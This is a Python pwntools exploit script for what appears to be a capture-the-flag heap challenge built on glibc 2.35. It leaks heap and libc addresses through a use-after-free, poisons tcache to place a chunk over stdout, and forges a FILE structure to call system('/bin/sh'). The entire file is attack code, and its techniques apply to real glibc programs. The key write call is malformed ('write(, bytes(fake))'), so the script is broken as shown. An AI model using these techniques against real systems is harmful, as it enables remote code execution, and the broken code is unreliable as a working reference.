#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

def conn():
    if args.LOCAL:
        r = process([exe.path]) #, aslr=False)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def add(sz, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(sz).encode())
    r.sendafter(b"Data?\n", data)

def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode())

def print_memory(idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode())
    r.recvuntil(b"Data: ")
    return r.recvline().strip()


def main():
    for i in range(10):
        add(0x100 - 9, b"A" * 20)

    free(0)
    heap_leak = print_memory(0)
    heap_leak = u64(heap_leak.ljust(8, b"\x00"))
    heap_leak = heap_leak << 12
    log.info("Heap leak: " + hex(heap_leak))

    for i in range(1, 7):
        free(i)

    free(7) # chunk for consolidation
    free(8) # victim chunk

    libc_leak = print_memory(7)
    libc_leak = u64(libc_leak + b"\x00" * (8 - len(libc_leak)))
    log.info("Libc leak: " + hex(libc_leak))
    libc.address = libc_leak - 0x21ace0
    log.success("Libc base: " + hex(libc.address))



    add(0x100 - 9, b"A" * 20) # take something out from tcache
    free(8)

    addr = libc.sym['_IO_2_1_stdout_'] ^ ((heap_leak + 0xaa0) >> 12)
    payload = b"\x00" * 0xf0 + p64(0x100) + p64(0x100) + p64(addr)
    add(0x120, payload)

    # some constants
    stdout_lock = libc.address + 0x2008f0   # _IO_stdfile_1_lock  (symbol not exported)
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    # our gadget
    gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx

    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
    # write the fake Filestructure to stdout
    write(, bytes(fake))
    # enjoy your shell
    



    

    gdb.attach(r, '''heap chunks
               heap bins
               ''')


    r.interactive()


if __name__ == "__main__":
    main()
